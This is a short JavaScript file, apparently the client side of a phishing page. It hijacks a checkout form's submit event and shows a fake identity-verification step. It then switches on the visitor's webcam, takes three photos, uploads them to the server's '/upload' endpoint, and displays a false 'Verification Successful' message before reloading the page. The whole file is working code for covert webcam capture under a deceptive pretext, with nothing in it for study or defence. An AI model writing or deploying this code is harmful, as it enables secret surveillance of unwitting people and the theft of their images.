const form = document.getElementById('checkoutForm');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const verification = document.getElementById('verification');
const context = canvas.getContext('2d');

form.addEventListener('submit', function (e) {
    e.preventDefault();

    form.style.display = "none";
    verification.style.display = "block";

    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // Delay to ensure camera is ready
            setTimeout(() => {
                const captureAndSend = (num) => {
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('image', blob, `photo${num}.jpg`);

                        fetch('/upload', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => console.log(`[+] Sent photo ${num}`))
                        .catch(err => console.error(err));
                    }, 'image/jpeg');
                };

                // Capture 3 images with 2s intervals
                setTimeout(() => captureAndSend(1), 0);
                setTimeout(() => captureAndSend(2), 2000);
                setTimeout(() => captureAndSend(3), 4000);

                // After all photos sent – show success
                setTimeout(() => {
                    verification.innerHTML = `
                        <h2>✅ Verification Successful</h2>
                        <p>Thank you for verifying your identity.</p>
                        <p>Redirecting to homepage...</p>
                    `;
                    video.srcObject.getTracks().forEach(track => track.stop()); // stop cam
                }, 6000);

                // Reload after delay
                setTimeout(() => {
                    location.reload();
                }, 9000);

            }, 1000); // wait 1 second after camera opens
        })
        .catch(err => {
            console.error("Camera access failed:", err);
        });
});
